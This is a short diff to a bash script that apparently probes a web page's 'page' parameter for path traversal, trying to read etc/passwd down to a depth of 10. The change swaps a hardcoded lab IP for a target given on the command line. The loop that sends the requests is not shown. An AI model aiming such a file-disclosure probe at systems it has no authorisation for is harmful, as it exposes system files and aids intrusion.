@@ -1,6 +1,12 @@
 #!/bin/bash
 
-TARGET="http://192.168.56.102/index.php?page="
+if [ -z "$1" ]; then
+    echo "Usage: $0 <target_ip>"
+    echo "Example: $0 192.168.56.102"
+    exit 1
+fi
+
+TARGET="http://$1/index.php?page="
 FILE="etc/passwd"
 MAX_DEPTH=10
 
